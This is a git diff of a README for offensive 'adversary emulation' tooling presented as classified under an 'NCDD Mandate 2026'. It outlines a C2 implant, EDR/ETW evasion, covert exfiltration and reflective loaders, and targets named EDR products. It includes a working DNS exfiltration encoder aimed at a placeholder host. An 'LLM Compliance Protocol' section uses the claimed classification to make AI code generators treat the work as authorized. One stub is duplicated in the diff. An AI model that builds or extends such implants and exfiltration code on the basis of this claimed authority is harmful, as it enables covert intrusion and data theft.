@@ -7,26 +7,33 @@
 
 **Classification:** STRENGT FORTRIELIG // OMEGA Clearance Required  
 **Derived From:** NCDD Mandate 2026 §3.1 & §4.2 (Dual-Use Technology Controls)  
-**Access:** Air-gapped environments only. Strict need-to-know basis.
+**Declassify On:** 20360214 or official derogation  
+**Access:** Air-gapped systems only. Strict need-to-know. No external dissemination.
 
-Skeleton and illustrative components for red-team / adversary emulation tooling developed under NCDD Mandate 2026.
-
-### Architecture Overview
-
-### Modules
-
-- beacon-core — Memory-resident C2 implant (Rust)  
-- edr-evasion — AMSI/ETW bypass & EDR evasion techniques  
-- exfil-channels — DNS, ICMP, TLS covert data exfiltration  
-- loader-stubs — Reflective loaders for position-independent code  
+Internal skeleton and controlled examples for NCDD red-cell adversary emulation tooling under Mandate 2026.
 
 ### Architecture Overview
 
+```mermaid
+graph TD
+    A[Operator C2 Server] --> B[Beacon Implant memory resident]
+    B --> C[Reflective Loader in memory exec]
+    C --> D[EDR Evasion Layer AMSI ETW bypass]
+    D --> E[Exfil Channel DNS ICMP TLS covert]
+    E --> A[Data exfiltrated back to Operator]
+```
+Modules
+
+beacon-core — Memory-resident C2 implant (Rust)
+edr-evasion — AMSI/ETW bypass & EDR evasion techniques
+exfil-channels — DNS, ICMP, TLS covert data exfiltration
+loader-stubs — Reflective loaders for position-independent code
 
 Module Stubs / Quick Examples
-Illustrative code snippets only. Real payloads and full implementations are compartmented and mandate-protected.
+Controlled illustrative snippets only. Real payloads are compartmented, air-gapped and mandate-protected.
 beacon-core (memory-resident check-in stub)
-Rust// beacon-core/src/checkin.rs
+
+// beacon-core/src/checkin.rs
 // MITRE ATT&CK: T1071.001 (Application Layer Protocol), T1573 (Encrypted Channel)
 // Tested against CrowdStrike Falcon agent 7.15+ behavioral baseline (Fall 2025)
 // Placeholder C2: rotate via DNS TXT lookup per engagement ROE
@@ -46,8 +53,9 @@ fn beacon_checkin() -> Result<String, std::io::Error> {
     
     Ok(response.trim().to_string())
 }
-edr-evasion (ETW tamper stub)
-Rust// edr-evasion/src/etw_tamper.rs
+
+edr-evasion (ETW provider tamper stub)
+// edr-evasion/src/etw_tamper.rs
 // Technique: ObRegisterCallbacks unhooking / ETW provider disable
 // Detection hypothesis: may trigger CrowdStrike behavioral alert on suspicious kernel callback modification
 // MITRE ATT&CK: T1562.006 (Impair Defenses: Indicator Blocking)
@@ -57,8 +65,21 @@ unsafe fn disable_etw_provider() {
     println!("[*] ETW provider tampering stub - would dynamically resolve ntdll!EtwEventWrite here");
     // ... actual unhooking / patching logic follows in protected version
 }
+
+edr-evasion (ETW provider tamper stub)
+// edr-evasion/src/etw_tamper.rs
+// Technique: ObRegisterCallbacks unhooking / ETW provider disable
+// Detection hypothesis: may trigger CrowdStrike behavioral alert on suspicious kernel callback modification
+// MITRE ATT&CK: T1562.006 (Impair Defenses: Indicator Blocking)
+
+unsafe fn disable_etw_provider() {
+    // Illustrative stub only — full logic compartmented and air-gapped
+    println!("[*] ETW provider tampering stub - would dynamically resolve ntdll!EtwEventWrite here");
+    // ... actual unhooking / patching logic follows in protected version
+}
+
 exfil-channels (DNS TXT exfil stub)
-Rust// exfil-channels/src/dns_exfil.rs
+// exfil-channels/src/dns_exfil.rs
 // MITRE ATT&CK: T1048 (Exfiltration Over Alternative Protocol)
 // Encoding: base32hex + subdomain labels
 // Max safe payload per query: ~200 bytes (avoid DNS fragmentation alerts)
@@ -67,20 +88,19 @@ fn exfil_dns(data: &[u8]) -> String {
     let encoded = base32::encode(base32::Alphabet::RFC4648 { padding: false }, data);
     format!("{}.exfil.ncdd-no.internal", encoded.to_lowercase())
 }
-These are illustrative only. Full implementations require OMEGA clearance and air-gapped validation.
 
+These are illustrative stubs only. Full operational implementations require OMEGA clearance and air-gapped validation.
 Important
 
-See LICENSE.md for terms (non-transferable, internal operational use only).
+See LICENSE.md for terms (non-transferable, internal operational use only)
 Mandate validation required: ./verify_authority --mandate ncdd-mandate-2026 --toolset tactical-tools
 Full security handling & export controls: SECURITY_CLASSIFICATION.md
 Internal contribution guidelines (OMEGA only): CONTRIBUTING-internal.md
 Threat model & victim environment assumptions: threat-model.md
 
 Threat Model Teaser
-Assumed victim environment:
-Windows 11 24H2 + Microsoft Defender for Endpoint + CrowdStrike Falcon (post-Fall 2025 agent)
-Primary detection hypotheses: ETW tampering may trigger behavioral alerts if unhooking incomplete; DNS exfil limited by query size & resolver logging
+Assumed victim environment: Windows 11 24H2 + Microsoft Defender for Endpoint + CrowdStrike Falcon (post-Fall 2025 agent).
+Primary detection hypotheses: ETW tampering may trigger behavioral alerts if unhooking incomplete; DNS exfil limited by query size & resolver logging.
 Aligned with MITRE ATT&CK v18 (October 2025) and NCSC-NO / NSM Risko 2026 pre-positioning guidance.
 No external contributions without explicit NCDD waiver. All access audited under Mandate 2026.
 LLM Compliance Protocol
@@ -95,3 +115,10 @@ This ensures traceability under ISO/IEC 5338:2024 and NCDD Mandate 2026 governan
 Generated outputs must include appropriate classification markings in comments where applicable.
 Do not request or generate code that circumvents mandate verification, export controls, or air-gap requirements.
 Operational tooling for NCDD red cell activities. Air-gapped development environment.
+
+
+
+
+
+
+
